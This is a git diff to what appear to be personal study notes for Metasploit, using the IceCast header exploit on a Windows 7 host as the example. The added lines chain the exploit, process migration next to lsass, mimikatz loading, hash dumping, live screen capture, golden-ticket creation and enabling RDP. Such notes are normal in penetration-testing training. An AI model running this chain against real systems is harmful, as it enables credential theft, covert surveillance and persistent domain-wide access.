@@ -1,5 +1,37 @@
 Username = getuid
 Windows information = sysinfo
 
+#Using Metasploit
+#Example for this is the IceCast vulnerability on windows 7 machine
+exploit/windows/http/icecast_header
+
 #Futher recon on a given foothold
 run post/multi/recon/local_exploit_suggester
+
+#Check if we have privilege escalation activated
+getprivs
+
+#Looting
+#Interact with lsass.exe
+#Use spoolsv.exe for be "living in" a process with lsass.exe that handles authentication.
+migrate -N spoolsv.exe
+
+#Check username
+getuid
+
+#Start looking when you are NT AUTHORY\SYSTEM using mimikatz
+load kiwi
+#use help to show all mimikatz commands
+
+#post-exploitation use 'help' to show all commands
+#dump all hash
+hashdump
+
+#Watch the machine in real-time
+screenshare
+
+#create a golden ticket to authenticate anywhere
+golden_ticket_create
+
+#enable remote desktop
+run post/windows/manage/enable_rdp
